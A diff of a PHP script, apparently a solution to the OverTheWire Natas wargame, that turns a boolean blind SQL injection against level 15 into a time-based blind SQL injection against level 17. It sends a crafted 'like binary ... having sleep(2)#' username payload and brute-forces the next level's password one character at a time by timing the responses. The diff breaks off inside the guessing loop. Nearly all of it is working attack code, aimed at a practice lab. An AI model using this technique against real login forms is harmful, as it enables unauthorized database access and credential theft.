@@ -1,26 +1,29 @@
 <?php
-$injectionString = 'natas16" and password like binary "';
-
-$ifUserExists = function ($injectionString) use ($argv) {
-    $ch = curl_init('http://natas15.natas.labs.overthewire.org/index.php');
+$sleep = 2;
+$ifUserExists = function ($injectionString) use ($argv, $sleep) {
+    $ch = curl_init('http://natas17.natas.labs.overthewire.org/index.php');
     curl_setopt($ch, CURLOPT_HTTPHEADER, [
         'Authorization: Basic ' . $argv[1],
     ]);
     curl_setopt($ch, CURLOPT_POST, 1);
     curl_setopt($ch, CURLOPT_POSTFIELDS, 'username=' . $injectionString);
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    $output = curl_exec($ch);
+    curl_exec($ch);
+    $time = curl_getinfo($ch)['total_time_us'] / 1000000;
     curl_close($ch);
-    return strpos($output, 'This user exists') !== false;
+    return $time > $sleep;
 };
 
 $dictionary = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
 
+$injectionPrefix = "natas18\" and password like binary \"";
+$injectionPostfix = "\" having sleep($sleep)#";
+
 $password = '';
-while ($ifUserExists($injectionString . $password . '%')) {
+while ($ifUserExists($injectionPrefix . $password . '%' . $injectionPostfix)) {
     $startStepLength = strlen($password);
     foreach (str_split($dictionary) as $char) {
-        $testString = $injectionString . $password . $char . '%';
+        $testString = $injectionPrefix . $password . $char . '%' . $injectionPostfix;
         $test = $ifUserExists($testString);
         echo '.';
         if ($ifUserExists($testString)) {
